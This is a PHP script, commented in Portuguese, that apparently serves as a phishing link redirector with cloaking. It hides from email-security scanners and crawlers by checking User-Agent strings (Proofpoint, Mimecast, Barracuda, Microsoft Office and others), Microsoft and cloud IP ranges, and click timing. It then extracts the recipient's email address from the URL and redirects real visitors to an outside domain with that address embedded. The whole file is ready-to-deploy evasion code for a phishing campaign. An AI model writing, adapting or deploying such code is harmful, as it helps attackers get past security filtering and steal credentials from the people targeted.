<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Bots por User-Agent
$bot_agents = [
    'Microsoft Office', 'msnbot', 'Outlook-iOS',
    'Google-Safety', 'Barracuda', 'Proofpoint',
    'Mimecast', 'Sophos', 'Symantec',
    'curl', 'python-requests', 'Go-http-client',
    'Wget', 'libwww-perl'
];
foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        http_response_code(200);
        exit;
    }
}

// Ranges Microsoft Corporation
$microsoft_ranges = [
    ['20.64.0.0',    '20.127.255.255'],
    ['4.144.0.0',    '4.159.255.255'],
    ['20.192.0.0',   '20.255.255.255'],
    ['20.226.12.0',  '20.226.12.255'],
    ['40.80.0.0',    '40.95.255.255'],
    ['13.64.0.0',    '13.95.255.255'],
    ['52.160.0.0',   '52.191.255.255'],
    ['13.104.0.0',   '13.107.255.255'],
    ['20.0.0.0',     '20.31.255.255'],
    ['172.160.0.0',  '172.191.255.255'],
    ['52.96.0.0',    '52.111.255.255'],
    ['52.112.0.0',   '52.115.255.255'],
    ['104.40.0.0',   '104.47.255.255'],
    ['4.192.0.0',    '4.207.255.255'],
];
$ip_long = ip2long($ip);
if ($ip_long !== false) {
    foreach ($microsoft_ranges as $range) {
        if ($ip_long >= ip2long($range[0]) && $ip_long <= ip2long($range[1])) {
            http_response_code(200);
            exit;
        }
    }
}

// Ranges AWS/GCP por prefixo
$bot_ip_prefixes = [
    '54.', '52.1', '34.', '35.',
    '185.220.',
];
foreach ($bot_ip_prefixes as $prefix) {
    if (strpos($ip, $prefix) === 0) {
        http_response_code(200);
        exit;
    }
}

// Filtro de timing — bots clicam em menos de 3 segundos
$sent_time = $_GET['t'] ?? 0;
if ($sent_time && (time() - (int)$sent_time) < 3) {
    http_response_code(200);
    exit;
}

$baseUrl = 'https://www.okieweb.com/';

function generateSegment($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $result;
}

function decodeEmailFromUrl(string $part): string {
    $part = rtrim($part, '=');
    $b64url = str_pad(strtr($part, '-_', '+/'), strlen($part) + (4 - strlen($part) % 4) % 4, '=');
    $decoded = base64_decode($b64url, true);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        return $decoded;
    }
    $b64 = str_pad($part, strlen($part) + (4 - strlen($part) % 4) % 4, '=');
    $decoded = base64_decode($b64, true);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        return $decoded;
    }
    return '';
}

$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$email = '';

$path  = parse_url($requestUri, PHP_URL_PATH) ?? '';
$parts = explode('/', trim($path, '/'));

foreach ($parts as $part) {
    if (empty($part)) continue;

    // Modo 1: base64url ou base64 normal
    $decoded = decodeEmailFromUrl($part);
    if ($decoded !== '') {
        $email = $decoded;
        break;
    }

    // Modo 2: email cru exato no segmento
    if (filter_var($part, FILTER_VALIDATE_EMAIL)) {
        $email = $part;
        break;
    }

    // Modo 3: email cru misturado no segmento
    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $part, $m)) {
        $email = $m[1];
        break;
    }
}

// Modo 4: fallback regex na URL inteira
if (empty($email)) {
    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
        $email = $matches[1];
    }
}

// Com ou sem email — sempre redireciona com segmentos randômicos
if (!empty($email)) {
    $urls = [
        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
    ];
} else {
    $urls = [
        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
    ];
}

$randomUrl = $urls[array_rand($urls)];
header("Location: " . $randomUrl, true, 302);
exit();
?>
